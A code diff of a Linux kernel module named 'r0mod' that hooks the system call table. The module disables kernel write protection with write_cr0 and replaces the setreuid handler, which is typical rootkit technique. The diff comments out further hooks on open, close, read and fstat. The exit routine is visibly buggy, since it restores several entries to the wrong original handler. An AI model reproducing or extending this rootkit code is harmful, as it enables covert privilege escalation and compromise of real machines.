@@ -2,10 +2,10 @@
 #include <linux/kernel.h>
 #include <linux/module.h>
 
-#include <linux/unistd.h>
-#include <linux/syscalls.h>
+#include <linux/unistd.h>   // syscalls
+#include <linux/syscalls.h> // syscalls
 
-#include <asm/paravirt.h> /* write_cr0 */
+#include <asm/paravirt.h>   // write_cr0
 
 #include <r0mod/global.h>
 
@@ -97,17 +97,17 @@ static int __init r0mod_init(void)
     orig_setreuid = (void *)syscall_table[__NR_setreuid];
     syscall_table[__NR_setreuid] = (unsigned long)new_setreuid;
 
-    orig_open  = (void *)syscall_table[__NR_open];
-    syscall_table[__NR_open] = (unsigned long)new_open;
+    //orig_open  = (void *)syscall_table[__NR_open];
+    //syscall_table[__NR_open] = (unsigned long)new_open;
 
-    orig_close = (void *)syscall_table[__NR_close];
-    syscall_table[__NR_close] = (ssize_t)new_close;
+    //orig_close = (void *)syscall_table[__NR_close];
+    //syscall_table[__NR_close] = (ssize_t)new_close;
 
-    orig_read  = (void *)syscall_table[__NR_read];
-    syscall_table[__NR_read] = (unsigned long)new_read;
+    //orig_read  = (void *)syscall_table[__NR_read];
+    //syscall_table[__NR_read] = (unsigned long)new_read;
 
-    orig_fstat = (void *)syscall_table[__NR_fstat];
-    syscall_table[__NR_fstat] = (unsigned long)new_fstat;
+    //orig_fstat = (void *)syscall_table[__NR_fstat];
+    //syscall_table[__NR_fstat] = (unsigned long)new_fstat;
 
     write_cr0(read_cr0() | 0x10000);
 
@@ -124,10 +124,10 @@ static void __exit r0mod_exit(void)
         write_cr0(read_cr0() & (~0x10000));
 
         syscall_table[__NR_setreuid] = (unsigned long)orig_setreuid;
-        syscall_table[__NR_open] = (unsigned long)orig_setreuid;
-        syscall_table[__NR_close] = (ssize_t)orig_setreuid;
-        syscall_table[__NR_read] = (unsigned long)orig_setreuid;
-        syscall_table[__NR_fstat] = (unsigned long)orig_setreuid;
+        //syscall_table[__NR_open] = (unsigned long)orig_setreuid;
+        //syscall_table[__NR_close] = (ssize_t)orig_setreuid;
+        //syscall_table[__NR_read] = (unsigned long)orig_setreuid;
+        //syscall_table[__NR_fstat] = (unsigned long)orig_setreuid;
 
         write_cr0(read_cr0() | 0x10000);
     }
